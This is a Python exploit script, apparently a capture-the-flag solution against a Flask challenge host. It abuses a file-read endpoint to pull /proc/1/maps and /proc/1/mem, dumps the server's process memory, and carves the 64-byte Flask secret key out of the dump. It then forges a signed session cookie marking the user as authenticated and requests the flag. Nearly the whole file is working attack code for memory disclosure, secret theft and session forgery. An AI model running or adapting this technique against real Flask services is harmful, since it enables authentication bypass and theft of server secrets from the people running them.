import requests
import re
import tqdm
import os
import flask_unsign

#HOST = "http://babysessionforger.hkn"
HOST = "http://realsessionforger.hkn"
# HOST = "http://192.168.0.141"
# HOST = "http://127.0.0.1"

# use form-data
def read_file(filename, offset, amount) -> bytes:
    url = f"{HOST}/fileread"
    files = {
        "filename": (None, filename),
        "offset": (None, str(offset)),
        "amount": (None, str(amount))
    }
    response = requests.post(url, files=files)
    return response.content

def dump_memory(maps: bytes) -> list:
    with open("./flask.dump", 'wb') as dump_file:
        for line in tqdm.tqdm(maps.splitlines(), desc="Dumping memory", unit="line"):
            line = line.decode("utf-8")
            # get start and end address, whether it is readable or not
            m = re.match(r'([0-9A-Fa-f]+)-([0-9A-Fa-f]+) ([rwxsp-]+) .* ([0-9A-Fa-f]+):([0-9A-Fa-f]+) (.*)', line)
            if m is None:
                print(f"Failed to parse line: {line}")
                continue
            # check if it is readable
            if m.group(3) and "r" in m.group(3):
                try:
                    start = int(m.group(1), 16)
                    end = int(m.group(2), 16)
                    chunk = read_file("/proc/1/mem", start, end - start)
                    dump_file.write(chunk)

                    if any(part in line for part in ["[heap]", "[stack]", "[vdso]", "[vvar]"]):
                        print(f"Found {line.split(' ')[-1].strip()}")
                        # dump the memory
                        with open(f"{line.split(' ')[-1].strip().replace("[","").replace("]","")}_dump", 'wb') as chunk_file:
                            chunk_file.write(chunk)
                    
                except:
                    pass

def read_heap_dump():
    print("Reading heap dump...")
    with open("flask.dump", 'rb') as f:
        data = f.read()
    # We want to find urandom(64) in the dumped data, so let's search for it
    # We essentially want to find all occurences of 64 bytes of random data
    # and then we check if it's the correct urandom

    # Get the flask cookie
    request = requests.get(f"{HOST}/")
    cookie = request.cookies["session"]
    print(cookie)

    # Debug
    if False:
        # The request gives the app secret key and whether authed as response
        # We can use this to find the correct urandom
        secret_byte_string = request.text.split()[0] # byte string as text, like b'\x00'
        secret_bytes = eval(secret_byte_string)
        print(secret_bytes)

        # print as hex
        secret_hex = secret_bytes.hex()
        print(secret_hex)

    # return
        
    # this comes before the secret in the dump
    hex_prefix = "2F 75 73 72 2F 6C 69 62 2F 70 79 74 68 6F 6E 33 2F 64 69 73 74 2D 70 61 63 6B 61 67 65 73 2F 73 69 6D 70 6C 65 6A 73 6F 6E 2D 33 2E 31 39 2E 32 2E 65 67 67 2D 69 6E 66 6F 00 72 79 5F 70 6F 69 6E 74 73 2E 74 78 74"
    hex_prefix_2 = "FF FF FF FF FF FF FF FF"

    # convert to bytes
    hex_prefix_bytes = bytes.fromhex(hex_prefix.replace(" ", ""))
    print(hex_prefix_bytes)

    # convert to bytes
    hex_prefix_2_bytes = bytes.fromhex(hex_prefix_2.replace(" ", ""))
    print(hex_prefix_2_bytes)

    # find the prefix in the dump
    index = data.find(hex_prefix_bytes)
    print(f"Prefix found at {index}")
    # get the index of prefix 2, from the end of the prefix
    index_2 = data.find(hex_prefix_2_bytes, index + len(hex_prefix_bytes))
    print(f"Prefix 2 found at {index_2}")

    # get the next 64 bytes
    secret_check = data[index_2 + len(hex_prefix_2_bytes):index_2 + len(hex_prefix_2_bytes) + 64]
    print(secret_check)
    # check if the secret is the same
    # if secret_check == secret_bytes:
    #     print("Secret found!")
    # else:
    #     print("Secret not found!")

    # Check if secret can sign a new cookie

    # check verify old cookie
    print("Checking old cookie...")
    verified = flask_unsign.verify(cookie, secret=secret_check)
    if verified:
        print("Old cookie is valid!")
    else:
        print("Old cookie is not valid!")

    print("Signing new cookie...")
    new_cookie = flask_unsign.sign(value='{"authed": True}', secret=secret_check)
    print(new_cookie)
    # Check if the new cookie is valid
    print("Checking new cookie...")
    verified = flask_unsign.verify(new_cookie, secret=secret_check)
    if verified:
        print("New cookie is valid!")
    else:
        print("New cookie is not valid!")

    flag = requests.get(f"{HOST}/flag", cookies={"session": new_cookie})
    print(flag.text)
    # Check if the flag is valid
    if "Naa" in flag.text or not flag.text:
        print("Flag is not valid!")
    else:
        print("Flag is valid!")


def main():
    # /proc/1/maps
    maps = read_file("/proc/1/maps", 0, 0x100000)
    #print(maps)
    # parse and dump maps
    dump_memory(maps)
    read_heap_dump()

if __name__ == "__main__":
    # change dir to the script's dir
    os.chdir(os.path.dirname(os.path.abspath(__file__)))

    main()